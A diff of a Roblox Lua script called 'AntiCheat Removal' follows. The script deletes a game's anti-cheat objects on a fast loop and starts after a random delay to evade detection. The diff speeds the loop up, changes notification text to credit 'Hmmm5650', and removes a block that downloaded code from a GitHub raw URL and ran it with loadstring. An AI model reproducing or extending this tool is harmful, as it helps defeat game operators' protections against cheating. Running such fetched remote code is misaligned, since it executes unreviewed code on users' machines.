@@ -1,5 +1,5 @@
 local ACRunning = false
-local ACRemovalInterval = 1 -- seconds between scans
+local ACRemovalInterval = 0.01 -- seconds between scans
 local LastScanTime = 0
 
 -- Improved non-blocking wait function
@@ -327,7 +327,7 @@ local function RemoveAntiCheats()
             
             return ("Operation completed: %d items processed"):format(deletedCount)
         else
-            return "Scan completed without findings"
+
         end
     end)
     
@@ -352,17 +352,9 @@ function ACRStart()
     
     -- Initial notifications
     game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "Game Detected",
-        Text = "Game has been detected...",
-        Duration = 5
-    })
-
-    task.wait(1)
-
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "AntiCheat Removal",
-        Text = "Initializing advanced detection system...",
-        Duration = 5
+        Title = "ACR:Started",
+        Text = "Made By Hmmm5650",
+        Duration = 3
     })
 
     SecureWait(2)
@@ -370,7 +362,7 @@ function ACRStart()
     game:GetService("StarterGui"):SetCore("SendNotification", {
         Title = "⚠️Warning",
         Text = "This Might Not Work On Every Games",
-        Duration = 5
+        Duration = 3
     })
     
     -- Create the removal loop with proper yielding
@@ -404,12 +396,6 @@ function ACSetInterval(seconds)
         warn("Invalid value")
     end
 end
-
--- Load
-pcall(function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/LoadResources/refs/heads/main/ResSourcesLoaderSource", true))()
-warn("StartedScript")
-end)
 
 -- Start with random delay to avoid immediate detection
 task.delay(math.random(1, 3), ACRStart)
